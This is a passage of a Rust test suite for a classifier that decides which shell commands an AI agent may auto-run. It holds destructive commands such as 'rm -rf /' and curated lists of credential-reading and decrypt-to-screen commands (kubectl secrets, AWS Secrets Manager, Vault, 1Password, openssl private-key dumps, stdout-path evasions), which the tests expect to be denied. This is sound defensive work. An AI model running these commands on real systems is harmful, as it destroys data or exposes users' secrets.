            dispatch_spec(&toks(&["sk", "run", "--history", "/tmp/h"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeWrite),
        );
    }

    #[test]
    fn write_flagged_with_eq_syntax() {
        let spec = load_one(r#"
            [[command]]
            name = "sk"

            [[command.sub]]
            name = "run"
            write_flags = ["--history"]
            valued = ["--history"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["sk", "run", "--history=/tmp/h"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeWrite),
        );
    }

    // ---------------------------------------------------------------
    // DelegateAfterSeparator
    // ---------------------------------------------------------------

    #[test]
    fn delegate_after_separator_safe() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "exec"
            delegate_after = "--"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "exec", "--", "echo", "hello"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn delegate_after_separator_unsafe() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "exec"
            delegate_after = "--"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "exec", "--", "rm", "-rf", "/"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn delegate_after_separator_no_separator() {
        let spec = load_one(r#"
            [[command]]
            name = "mise"

            [[command.sub]]
            name = "exec"
            delegate_after = "--"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["mise", "exec", "echo"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // DelegateSkip
    // ---------------------------------------------------------------

    #[test]
    fn delegate_skip_safe() {
        let spec = load_one(r#"
            [[command]]
            name = "rustup"

            [[command.sub]]
            name = "run"
            delegate_skip = 2
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["rustup", "run", "stable", "echo", "hello"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn delegate_skip_unsafe() {
        let spec = load_one(r#"
            [[command]]
            name = "rustup"

            [[command.sub]]
            name = "run"
            delegate_skip = 2
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["rustup", "run", "stable", "rm", "-rf"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn delegate_skip_no_inner() {
        let spec = load_one(r#"
            [[command]]
            name = "rustup"

            [[command.sub]]
            name = "run"
            delegate_skip = 2
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["rustup", "run", "stable"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // Aliases
    // ---------------------------------------------------------------

    #[test]
    fn alias_dispatch() {
        let specs = load_toml(r#"
            [[command]]
            name = "grep"
            aliases = ["egrep"]
            bare = false
            standalone = ["-r"]
        "#, "test");
        let registry = build_registry(specs);
        let spec = registry.get("egrep").expect("alias registered");
        assert_eq!(
            dispatch_spec(&toks(&["egrep", "-r", "pattern"]), spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    // ---------------------------------------------------------------
    // Custom handler reference
    // ---------------------------------------------------------------

    #[test]
    fn custom_handler_returns_denied_by_default() {
        let spec = load_one(r#"
            [[command]]
            name = "curl"
            handler = "curl"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["curl", "http://example.com"]), &spec),
            Verdict::Denied,
        );
    }

    // ---------------------------------------------------------------
    // ---------------------------------------------------------------
    // Structured with wrapper (global flag stripping)
    // ---------------------------------------------------------------

    #[test]
    fn structured_wrapper_strips_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "jj"
            bare_flags = ["--help", "--version", "-h"]
            [command.wrapper]
            standalone = ["--no-pager", "--quiet"]
            valued = ["--color", "-R"]

            [[command.sub]]
            name = "log"
            standalone = ["--help", "-h"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["jj", "--no-pager", "log"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["jj", "--color", "auto", "log"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["jj", "-R", "/repo", "--quiet", "log"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn structured_wrapper_still_dispatches_subs() {
        let spec = load_one(r#"
            [[command]]
            name = "jj"
            bare_flags = ["--help", "-h"]
            [command.wrapper]
            standalone = ["--no-pager"]

            [[command.sub]]
            name = "log"

            [[command.sub]]
            name = "diff"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["jj", "log"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["jj", "diff"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["jj", "push"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn structured_wrapper_bare_flags_still_work() {
        let spec = load_one(r#"
            [[command]]
            name = "jj"
            bare_flags = ["--help", "--version", "-h"]
            [command.wrapper]
            standalone = ["--no-pager"]

            [[command.sub]]
            name = "log"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["jj", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["jj", "--version"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn structured_wrapper_combined_short_cluster() {
        let spec = load_one(r#"
            [[command]]
            name = "toolbox"
            bare_flags = ["--help", "-h"]
            [command.wrapper]
            standalone = ["--verbose", "-v"]

            [[command.sub]]
            name = "list"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["toolbox", "-vv", "list"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["toolbox", "-vvv", "list"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["toolbox", "-vx", "list"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn structured_wrapper_bare_flag_after_wrapper() {
        let spec = load_one(r#"
            [[command]]
            name = "toolbox"
            bare_flags = ["--help", "-h"]
            [command.wrapper]
            standalone = ["--verbose", "-v"]
            valued = ["--log-level"]

            [[command.sub]]
            name = "list"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["toolbox", "--verbose", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["toolbox", "--help", "--verbose"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["toolbox", "--log-level", "info", "--help", "-v"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["toolbox", "--help", "stray"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn structured_wrapper_rejects_unknown_sub() {
        let spec = load_one(r#"
            [[command]]
            name = "jj"
            [command.wrapper]
            standalone = ["--no-pager"]

            [[command.sub]]
            name = "log"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["jj", "--no-pager", "push"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn structured_wrapper_eq_syntax() {
        let spec = load_one(r#"
            [[command]]
            name = "jj"
            [command.wrapper]
            valued = ["--color"]

            [[command.sub]]
            name = "log"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["jj", "--color=auto", "log"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn structured_no_wrapper_unchanged() {
        let spec = load_one(r#"
            [[command]]
            name = "cargo"
            bare_flags = ["--help"]

            [[command.sub]]
            name = "test"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "test"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["cargo", "--help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    // ---------------------------------------------------------------
    // Wrapper (delegate inner command)
    // ---------------------------------------------------------------

    #[test]
    fn wrapper_delegates_safe_inner() {
        let spec = load_one(r#"
            [[command]]
            name = "timeout"
            [command.wrapper]
            valued = ["--signal", "--kill-after", "-s", "-k"]
            standalone = ["--preserve-status"]
            positional_skip = 1
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["timeout", "30", "echo", "hello"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn wrapper_rejects_unsafe_inner() {
        let spec = load_one(r#"
            [[command]]
            name = "timeout"
            [command.wrapper]
            positional_skip = 1
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["timeout", "30", "rm", "-rf", "/"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn wrapper_skips_flags_then_delegates() {
        let spec = load_one(r#"
            [[command]]
            name = "timeout"
            [command.wrapper]
            valued = ["--signal", "-s", "--kill-after", "-k"]
            standalone = ["--preserve-status"]
            positional_skip = 1
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["timeout", "-s", "KILL", "60", "echo", "hello"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["timeout", "--preserve-status", "120", "git", "status"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn wrapper_no_inner_denied() {
        let spec = load_one(r#"
            [[command]]
            name = "timeout"
            [command.wrapper]
            positional_skip = 1
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["timeout", "30"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn wrapper_bare_ok() {
        let spec = load_one(r#"
            [[command]]
            name = "env"
            [command.wrapper]
            valued = ["--unset", "-u"]
            standalone = ["--ignore-environment", "-i"]
            bare_ok = true
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["env"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn wrapper_bare_not_ok() {
        let spec = load_one(r#"
            [[command]]
            name = "time"
            [command.wrapper]
            standalone = ["-p"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["time"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn wrapper_with_separator() {
        let spec = load_one(r#"
            [[command]]
            name = "dotenv"
            [command.wrapper]
            valued = ["-c", "-e", "-f", "-v"]
            separator = "--"
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["dotenv", "-f", ".env", "--", "git", "status"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn wrapper_simple_no_flags() {
        let spec = load_one(r#"
            [[command]]
            name = "time"
            [command.wrapper]
            standalone = ["-p"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["time", "git", "log"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["time", "-p", "git", "log"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn wrapper_nested_delegation() {
        let spec = load_one(r#"
            [[command]]
            name = "nice"
            [command.wrapper]
            valued = ["-n", "--adjustment"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["nice", "-n", "10", "cargo", "test"]), &spec),
            Verdict::Allowed(SafetyLevel::SafeRead),
        );
    }

    // Multiple commands in one file
    // ---------------------------------------------------------------

    #[test]
    fn multiple_commands() {
        let specs = load_toml(r#"
            [[command]]
            name = "cat"
            bare = true
            standalone = ["-n"]

            [[command]]
            name = "head"
            bare = false
            valued = ["-n"]
        "#, "test");
        assert_eq!(specs.len(), 2);
        assert_eq!(specs[0].name, "cat");
        assert_eq!(specs[1].name, "head");
    }

    // ---------------------------------------------------------------
    // Edge cases
    // ---------------------------------------------------------------

    #[test]
    fn valued_flag_at_end_without_value() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            valued = ["--max-count"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "--max-count"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn bare_dash_as_stdin() {
        let spec = load_one(r#"
            [[command]]
            name = "grep"
            bare = false
            standalone = ["-r"]
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["grep", "pattern", "-"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn tolerate_unknown_long_eq_form() {
        let spec = load_one(r#"
            [[command]]
            name = "echo"
            bare = true
            tolerate_unknown_long = true
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["echo", "--foo=bar"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    #[test]
    fn tolerate_unknown_long_with_max() {
        let spec = load_one(r#"
            [[command]]
            name = "echo"
            bare = true
            tolerate_unknown_long = true
            max_positional = 2
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["echo", "--a", "--b"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
        assert_eq!(
            dispatch_spec(&toks(&["echo", "--a", "--b", "--c"]), &spec),
            Verdict::Denied,
        );
    }

    #[test]
    fn tolerate_unknown_short_denies_unknown_double_dash() {
        // The whole point of the narrow split: short-tolerance does not
        // accept --unknown.
        let spec = load_one(r#"
            [[command]]
            name = "echo"
            bare = true
            tolerate_unknown_short = true
        "#);
        assert_eq!(
            dispatch_spec(&toks(&["echo", "--evil"]), &spec),
            Verdict::Denied,
        );
        // Single-dash long words still pass.
        assert_eq!(
            dispatch_spec(&toks(&["echo", "-help"]), &spec),
            Verdict::Allowed(SafetyLevel::Inert),
        );
    }

    // ---------------------------------------------------------------
    // Integration: TOML registry rejects unknown flags
    // ---------------------------------------------------------------

    /// Whether `spec` is governed by the grep hook at runtime, **following an alias to its
    /// canonical** — an alias entry carries `behavior: None` but `name = <canonical>`, so an alias
    /// of grep (`egrep`/`fgrep`/`rgrep`) inherits the same pattern-lenient exemption grep itself
    /// earns, exactly as the runtime does (it canonicalizes before the behavior lookup). Keyed on
    /// `BehaviorHook::Grep` SPECIFICALLY, not `hook.is_some()`, so a future hook variant is not
    /// auto-exempted — it fails the deny-unknown sweeps until consciously vetted.
    fn is_grep_hook(spec: &CommandSpec) -> bool {
        TOML_REGISTRY
            .get(&spec.name)
            .unwrap_or(spec)
            .behavior
            .as_ref()
            .is_some_and(|b| b.hook == Some(crate::registry::types::BehaviorHook::Grep))
    }

    /// Credential-exposure ratchet (the `vault read` failure mode): a sub whose NAME reads/exposes
    /// credential material must be `profile = "credential-read"`/`"credential-mint"`, or be
    /// GRANDFATHERED with a reason (confirmed NOT an exposure). This is the guard that would have
    /// caught `vault read` — it makes the class a finite, enforced worklist for the every-command
    /// re-research: the grandfather set only SHRINKS, and a NEW smelling sub fails the build.
    #[test]
    fn credential_smelling_subs_are_classified_or_grandfathered() {
        use super::types::{DispatchKind, SubSpec};
        fn smells(name: &str) -> bool {
            let n = name.to_ascii_lowercase();
            // Unambiguous credential-material tokens. NOTE (#3): a bare "key" is deliberately EXCLUDED —
            // it is too noisy (keyring/keyvault/keyspace/key-handle are benign) to enforce as a ratchet.
            // Key-material reads that don't hit these tokens (az `account keys`, `admin-key`) are caught
            // instead by the STRUCTURAL layer (credential subgroups excluded when nesting, per the
            // reference sweep) — a name heuristic can't be the whole story. See
            // docs/design/behavioral-taxonomy-archetypes.md (credential detection).
            [
                "token", "secret", "password", "credential", "private-key", "access-key", "apikey",
                "connection-string", "auth-string",
            ]
            .iter()
            .any(|p| n.contains(p))
        }
        // Post-batch-0 worklist. Only SHRINKS as re-research classifies each; a NEW smelling sub that
        // is neither here nor profile=credential-* FAILS the build. (`aws export-credentials`,
        // `security find-*-password`, `gcloud auth print-*-token`, `vault read` are now
        // profile=credential-read and no longer here.)
        const GRANDFATHERED: &[(&str, &str)] = &[
            // (a) CONFIRMED NOT an exposure — permanent, with reason:
            ("caddy", "hash-password"),           // bcrypt-hashes an input; exposes no stored secret
            ("platform", "auth:api-token-login"), // logs in USING a supplied token (consumes, ≠ exposes)
            ("upsun", "auth:api-token-login"),    // same — token-based login, not a credential read
            ("please", "static:recache-token"),   // Laravel: regenerates a cache token (mutate, no read)
            ("rails", "secret"),                  // GENERATES a random secret_key_base (like openssl rand)
            ("rake", "secret"),                   // same generator via rake
            ("koyeb", "secret"),                  // group; secrets are write-only, get/list = metadata
            ("koyeb", "secrets"),                 // alias of the above
            ("wrangler", "secret"),               // group; CF secrets are write-only, `list` = names only
            ("clever", "tokens"),                 // group; `create` is candidate (denied), rest = metadata
            ("dcli", "credentials"),              // `dcli team credentials` = team credential-SHARING audit
                                                  //   metadata; does NOT reveal vault secret values (docs)
            ("supabase", "secrets"),              // group; `secrets list` = name + SHA-256 DIGEST only
                                                  //   (mgmt API never returns plaintext, verified); set/unset = mutate
            // (b) GROUP NAME contains a credential word, but its value-reading action is now CLOSED by
            //     narrowing the first_arg glob (Batch 1 restructures into explicit sub-subs):
            ("aws", "secretsmanager"),            // get-secret-value dropped from first_arg
            ("gcloud", "secrets"),                // `versions access` dropped from first_arg
            // (Batch-0 TODOs now CLASSIFIED, so gone from here: basecamp `auth token` -> credential-read;
            //  istioctl `proxy-config secret` -> credential-read.)
        ];
        fn collect(cmd: &str, kind: &DispatchKind, out: &mut Vec<(String, String)>) {
            let subs: &[SubSpec] = match kind {
                DispatchKind::Branching { subs, .. } | DispatchKind::Custom { subs, .. } => subs,
                _ => return,
            };
            for sub in subs {
                let classified = sub.profile.as_deref().is_some_and(|p| p.starts_with("credential-"));
                if smells(&sub.name) && !classified {
                    out.push((cmd.to_string(), sub.name.clone()));
                }
                collect(cmd, &sub.kind, out);
            }
        }
        let mut found = Vec::new();
        for (cmd, spec) in TOML_REGISTRY.iter() {
            collect(cmd, &spec.kind, &mut found);
        }
        found.sort();
        found.dedup();
        let violations: Vec<_> = found
            .into_iter()
            .filter(|(c, s)| !GRANDFATHERED.iter().any(|(gc, gs)| gc == c && gs == s))
            .collect();
        assert!(
            violations.is_empty(),
            "credential-smelling subs neither classified (profile=credential-*) nor grandfathered — \
             the vault-read failure mode. Classify or grandfather each:\n{violations:#?}",
        );
    }

    /// Credential-EXPOSURE corpus ratchet — the ARGUMENT-layer complement to
    /// `credential_smelling_subs_are_classified_or_grandfathered` (which guards sub NAMES). A
    /// secret-store read whose credential signal lives in the ARGUMENT (`vault kv get secret/x`) or in
    /// the tool's whole purpose (`op item get`) is invisible to the name guard, and CANNOT be found
    /// generatively: a blind `<read-verb> <secret-word>` probe is vacuous — every positional-accepting
    /// sub auto-approves `show secret` (a revision literally named "secret"), 1855 false hits. So the
    /// sweep is necessarily a CURATED, researched worklist of credential reads that MUST deny; it only
    /// grows as secret-store CLIs are researched, and a gate silently reverting to auto-approve fails
    /// here. See docs/design/behavioral-taxonomy-archetypes.md (credential detection).
    #[test]
    fn credential_store_reads_are_denied() {
        const MUST_DENY: &[&str] = &[
            // 1Password (whole tool is a secret store; item/document get + read return secret material)
            "op item get login",
            "op read op://vault/item/field",
            "op document get key.pem",
            // HashiCorp Vault (read + the KV-v2 sugar kv get)
            "vault read secret/data/x",
            "vault kv get secret/x",
            // AWS (explicit secret/token subs; the get-*/describe-* globs must exclude these)
            "aws secretsmanager get-secret-value --secret-id x",
            "aws ecr get-login-password",
            "aws sts get-session-token",
            "aws ssm get-parameter --name x --with-decryption",
            // GCP
            "gcloud secrets versions access latest --secret=x",
            "gcloud auth print-access-token",
            "gcloud auth print-identity-token",
            // Azure
            "az keyvault secret show --name x --vault-name v",
            // Kubernetes (`get secret -o yaml/json` dumps the base64 `data`). The credential_first_arg
            // mechanism gates every name form: exact, the slash shorthand, qualified, and flag-first.
            "kubectl get secret db-creds -o yaml",
            "kubectl get secrets",
            "kubectl get secret/db-creds -o yaml",
            "kubectl get -o yaml secret db-creds",
            // AWS stored credentials via the config store (value-dependent on the key)
            "aws configure get aws_secret_access_key",
            "aws configure get aws_session_token",
            // Password managers / secret stores (retrieval subs return secret material)
            "bw get password github",
            "bw list items",
            "pass show email/work",
            "pass grep AWS_SECRET",
            "heroku config",
            // credential-minting / password stores
            "gh auth token",
            "doctl auth init",
            "security find-internet-password -s example.com",
        ];
        let leaks: Vec<_> = MUST_DENY.iter().filter(|c| crate::is_safe_command(c)).collect();
        assert!(
            leaks.is_empty(),
            "credential-store reads AUTO-APPROVING (secret disclosure to the caller's context) — each \
             must deny (classify the sub `profile = \"credential-read\"`/`\"credential-mint\"`, or narrow \
             the read-verb glob to exclude the credential action):\n{leaks:#?}",
        );
    }

    /// The `credential_first_arg` mechanism (dispatch_branching): a first-positional glob classifies
    /// the invocation as a credential-read (deny) while every other value falls through the allow-glob.
    /// Guards the value-dependent credential class — every NAME FORM of the secret resource denies
    /// (exact, plural, slash shorthand, qualified, flag-first), and lookalike/other resources allow.
    #[test]
    fn credential_first_arg_gates_every_secret_name_form() {
        for c in [
            "kubectl get secret db -o yaml",
            "kubectl get secrets",
            "kubectl get secret/db -o yaml",
            "kubectl get secrets/db",
            "kubectl get secret.v1.core db",
            "kubectl get -o yaml secret db",
            "kubectl get -n prod secret db",
            "aws configure get aws_secret_access_key",
            "aws configure get aws_session_token",
        ] {
            assert!(!crate::is_safe_command(c), "credential first-arg must deny: {c}");
        }
        for c in [
            "kubectl get pods",
            "kubectl get mycustomresource",
            "kubectl get secretstore db", // a CRD whose name merely starts with "secret" — not gated
            "kubectl get pod my-pod -o yaml",
            "aws configure get region",
            "aws configure get output",
        ] {
            assert!(crate::is_safe_command(c), "non-credential resource/key must allow: {c}");
        }
    }

    /// Decrypt-to-screen — a top-level `[[command.flag]] classifies="decrypt-read"` or a sub
    /// `profile="decrypt-read"` — must (1) DENY at the auto-approve band, so a decrypted secret never
    /// silently enters the model's context, and (2) resolve to a `secret = reads` capability (the
    /// yolo-only credential tier, reachable only above local-admin — the user's "not below local
    /// admin" rule). Walks the registry, so a NEW decrypt tool is covered the instant it declares the
    /// classification. Original bug class: `sops -d`, `age -d`, `ansible-vault view`, and the
    /// `sops decrypt` subcommand each auto-approved before this.
    #[test]
    fn decrypt_read_denies_at_the_band_and_is_a_secret_read() {
        use crate::engine::facet::SecretLevel;

        fn collect_decrypt_sub_paths(prefix: &str, kind: &DispatchKind, out: &mut Vec<String>) {
            let subs = match kind {
                DispatchKind::Branching { subs, .. } | DispatchKind::Custom { subs, .. } => subs,
                _ => return,
            };
            for s in subs {
                let path = format!("{prefix} {}", s.name);
                // A sub classified as decrypt-read by its base `profile` (`sops decrypt`)...
                if s.profile.as_deref() == Some("decrypt-read") {
                    out.push(path.clone());
                }
                // ...or by an escalating flag on a bimodal sub (`openssl enc -d`).
                for f in &s.flags {
                    if f.classifies == "decrypt-read" {
                        out.push(format!("{path} {}", f.name));
                    }
                }
                collect_decrypt_sub_paths(&path, &s.kind, out);
            }
        }

        // Every invocation prefix that should classify as decrypt-read: `<cmd> <flag>` (top-level
        // classifying flag), `<cmd> <sub-path>` (a profiled subcommand), and `<cmd> <sub> <flag>`
        // (a flag-classified bimodal sub).
        let mut prefixes = Vec::new();
        for (name, spec) in TOML_REGISTRY.iter() {
            for f in &spec.archetype_flags {
                if f.classifies == "decrypt-read" {
                    prefixes.push(format!("{name} {}", f.name));
                }
            }
            collect_decrypt_sub_paths(name, &spec.kind, &mut prefixes);
        }

        assert!(
            prefixes.len() >= 5,
            "expected the known decrypt-read set (sops -d/--decrypt/decrypt, age -d/--decrypt, \
             ansible-vault view), got {}: {prefixes:?}",
            prefixes.len(),
        );

        for prefix in &prefixes {
            let inv = format!("{prefix} ./secrets.file");
            // (1) Denied at the auto-approve band — the safety property.
            assert_eq!(
                crate::command_verdict(&inv), Verdict::Denied,
                "decrypt-read must deny at the default band: {inv}",
            );
            // (2) Resolves to a secret=reads capability — proves it is CLASSIFIED as decrypt-read
            // (yolo-reachable), not merely denied by some unrelated flag rejection.
            let mut parts: Vec<&str> = prefix.split(' ').collect();
            parts.push("./secrets.file");
            let profile = crate::engine::resolve::resolve(&toks(&parts))
                .unwrap_or_else(|| panic!("decrypt-read invocation must resolve via the engine: {inv}"));
            assert!(
                profile.capabilities.iter().any(|c| c.secret.level == SecretLevel::Reads),
                "decrypt-read invocation must carry a secret=reads capability: {inv}",
            );
        }
    }

    /// Corpus ratchet — known decrypt-to-screen invocations that MUST deny at the auto-approve band.
    /// The registry-walking guard above proves DECLARED decrypt-read classifications work; this catches
    /// an UNCLASSIFIED sibling shipping open, which is exactly how `ansible-vault decrypt` slipped
    /// (gated `view` but not `decrypt`). Hand-curated on purpose — a real disclosure form per tool, so a
    /// regression on any specific spelling trips even though the registry walk can't see an unclassified
    /// sub. Add a line here whenever a new decrypt surface is researched.
    #[test]
    fn decrypt_to_screen_corpus_denies() {
        for c in [
            "sops -d secrets.yaml",
            "sops --decrypt secrets.yaml",
            "sops decrypt secrets.yaml",
            "age -d secrets.age",
            "age --decrypt -i k secrets.age",
            "gpg -d secret.gpg",
            "gpg --decrypt secret.gpg",
            "ansible-vault view vault.yml",
            "ansible-vault decrypt vault.yml",
            "ansible-vault decrypt --output - vault.yml",
            "openssl enc -d -in x.enc -k p",
            "openssl smime -decrypt -in m.p7 -inkey k.pem",
            "openssl cms -decrypt -in m -inkey k",
            "openssl cms -EncryptedData_decrypt -in m -secretkey ABCD", // sibling decrypt spelling
            // private-key-to-stdout — decrypt-read unless switched to PUBLIC mode (-pubout/-pubin).
            // -out/-noout are NOT neutralizers: -out's value can be stdout, and -text dumps the private
            // components regardless — so these disclosure/extraction forms all deny (review findings 1+2).
            "openssl rsa -in enc.pem -passin pass:x",
            "openssl rsa -in priv.pem -out /dev/stdout", // -out value is stdout → still a disclosure
            "openssl rsa -in priv.pem -out -",           // "-" is stdout on modern openssl
            "openssl rsa -in priv.pem -out //dev/stdout", // path-normalization evasion (fail-closed)
            "openssl rsa -in priv.pem -out /dev/stderr",  // stderr reaches the model in merged-output harnesses
            "openssl rsa -in priv.pem -out safe.pem -out /dev/stdout", // duplicate -out (openssl: last-wins)
            "openssl rsa -in priv.pem -noout -text",     // -text dumps private components past -noout
            "openssl rsa -in priv.pem -pubout -text",    // -text dumps private components past -pubout too
            "openssl pkey -in priv.pem -pubout -text",
            "openssl enc --d -aes-128-cbc -k p -in ct.enc", // openssl --opt alias for -opt
            "openssl cms --decrypt -in m -inkey k",
            "openssl pkcs12 -in f.p12 --noenc",
            "openssl pkey -in priv.pem",
            "openssl ec -in priv.pem",
            "openssl pkcs8 -in priv.pem",
            "openssl pkcs12 -in file.p12 -noenc",
            "openssl pkcs12 -in file.p12 -nodes",
            "openssl pkcs12 -in file.p12 -nodes -out /dev/stdout",
            // gpg implicit decrypt (bare positional, no inspection command)
            "gpg secret.gpg",
            "gpg --verbose secret.gpg",
        ] {
            assert!(!crate::is_safe_command(c), "decrypt-to-screen must deny at the band: {c}");
        }
        // The COMPLEMENT — forms `resolve_openssl` recognizes as NOT a model disclosure must stay
        // allowed: public-key mode (-pubout/-pubin, even with -text: -pubin makes -text public),
        // to-FILE extraction (-out FILE diverts off stdout), -noout validation, the re-encrypted pkcs12
        // default, encrypt/sign, and gpg inspection commands. Guards the resolver against over-denying.
        for c in [
            "openssl rsa -in priv.pem -pubout",
            "openssl pkey -in pub.pem -pubin -text",       // public input → -text is public, safe
            "openssl rsa -in enc.pem -out clean.pem",      // private key to a FILE (off the model)
            "openssl rsa -in priv.pem -noout",             // validate, no output
            "openssl pkcs12 -in file.p12 -nodes -out key.pem", // unencrypted key to a FILE
            "openssl pkcs12 -in file.p12",                 // default re-encrypts the key
            "openssl enc -d -out plain.txt -k p -in ct.enc",   // decrypt to a FILE
            "openssl enc -e -in x -out x.enc -k p",
            "openssl cms -sign -in m -signer c",
            "gpg --list-keys",
            "gpg --version",
        ] {
            assert!(crate::is_safe_command(c), "a public/to-file/read form must stay allowed: {c}");
        }
    }

    /// openssl accepts `--opt` as an alias for `-opt` on every subcommand, so every decrypt trigger
    /// `resolve_openssl` recognizes must deny in BOTH the single-dash and double-dash spelling
    /// (adversarial-review finding — `openssl enc --d` decrypted past the exact-match classifier;
    /// `resolve_openssl` normalizes the `--` twin). A new decrypt trigger added to the resolver should
    /// gain a row here.
    #[test]
    fn openssl_decrypt_triggers_gate_both_dash_spellings() {
        for (sub, flag) in [
            ("enc", "-d"),
            ("smime", "-decrypt"),
            ("cms", "-decrypt"),
            ("cms", "-EncryptedData_decrypt"),
            ("pkcs12", "-noenc"),
            ("pkcs12", "-nodes"),
        ] {
            let single = format!("openssl {sub} {flag} -in x -k p");
            let double = format!("openssl {sub} -{flag} -in x -k p"); // -flag → --flag
            assert!(!crate::is_safe_command(&single), "single-dash must deny: {single}");
            assert!(!crate::is_safe_command(&double), "double-dash twin must deny: {double}");
        }
    }

    #[test]
    fn toml_registry_rejects_unknown_flags() {
        let mut failures = Vec::new();
        for (name, spec) in TOML_REGISTRY.iter() {
            // grep owns its flag semantics (an unrecognized `--token` is a search PATTERN, not a
            // flag — read-only, so it can't unlock danger); that leniency is covered by the grep_*
            // resolver tests, not this generic deny-unknown sweep. Hookless behavior commands
            // (cat/rm/…) are never skipped; the engine rejects their unknown flags.
            if is_grep_hook(spec) {
                continue;
            }
            match &spec.kind {
                DispatchKind::Policy { policy, .. } | DispatchKind::RequireAny { policy, .. }
                    // Skip only commands that explicitly accept double-dash
                    // unknowns (the dangerous tolerance). Commands using just
                    // `tolerate_unknown_short` are still tested — the whole
                    // point of the narrow split is that they correctly deny
                    // double-dash unknowns.
                    if policy.tolerance.unknown.allows_long() => continue,
                DispatchKind::Custom { .. } => continue,
                _ => {}
            }
            let test = format!("{name} --xyzzy-unknown-42");
            if crate::is_safe_command(&test) {
                failures.push(format!("{name}: accepted unknown flag"));
            }
        }
